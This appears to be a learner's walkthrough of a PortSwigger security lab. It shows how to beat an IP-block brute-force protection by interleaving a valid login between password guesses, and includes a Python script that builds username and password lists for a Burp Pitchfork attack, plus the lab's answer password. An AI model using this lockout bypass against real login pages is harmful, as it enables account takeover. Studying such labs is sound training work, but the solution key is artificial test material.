https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block

This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

# Lab: Broken brute-force protection, IP block

1. First we will try to login using `wiener:peter`
2. Now we will try to login using `carlos` username and a random password. After 3 fail attempt in a strip we should wait for a minute.
3. After 2 fail login attempt if we use valid login info like `wiener:peter` we can continue the brute-force attack.

```
print("###username#######################################")
for i in range(150):
    if i % 3:
        print("carlos")
    else:
        print("wiener")
        
        
print("###password#######################################")
with open('pass.txt', 'r') as f:
    liles = f.readlines()

i = 0
for pwd in liles:
    if i % 3:
        print(pwd.strip("\n"))
    else:
        print("peter")
        print(pwd.strip('\n'))
        i = i + 1
    i = i + 1
```

4. Put the passwords in the `pass.txt` file and this 2 file in a same folder. 
5. Now Use  the username and password list from the code.
6. Go to Resource pool and set it to 1
7. now make Pitchfork attack.
8. `mustang` (Change every-time) this password return 302 status code. it is the password
9. Login with the username and password